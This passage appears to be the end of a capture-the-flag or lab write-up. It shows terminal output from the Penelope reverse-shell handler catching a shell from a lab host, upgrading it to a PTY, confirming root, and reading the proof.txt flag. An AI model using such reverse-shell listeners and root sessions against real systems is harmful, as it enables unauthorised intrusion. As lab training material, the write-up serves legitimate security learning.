0.1px;">└─<span class="cm-def">$ python3</span> penelope.py <span class="cm-attribute">-p</span> <span class="cm-number">65432</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Listening <span class="cm-keyword">for</span> reverse shells on <span class="cm-number">0</span>.0.0.0:65432 → &nbsp;<span class="cm-number">127</span>.0.0.1 • <span class="cm-number">192</span>.168.136.128 • <span class="cm-number">172</span>.17.0.1 • <span class="cm-number">172</span>.20.0.1 • <span class="cm-number">192</span>.168.45.236</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[-] Invalid shell from <span class="cm-number">192</span>.168.108.210 🙄</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Got reverse shell from pc~192.168.108.210-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Attempting to upgrade shell to PTY...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Shell upgraded successfully using /usr/bin/python3! 💪</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Interacting with session [1], Shell Type: PTY, Menu key: F12 </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Logging to /home/kali/.penelope/sessions/pc~192.168.108.210-Linux-x86_64/2026_01_13-03_11_58-503.log 📜</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/<span class="cm-comment"># whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/<span class="cm-comment"># </span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 307px;"></div><div class="CodeMirror-gutters" style="display: none; height: 307px;"></div></div></div></pre><p><span>Found </span><code>root.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/root<span class="cm-comment"># ls</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">email4.txt  proof.txt  snap</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/root<span class="cm-comment"># cat proof.txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">5239</span>...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre></div></div>
 </body>
 </html>
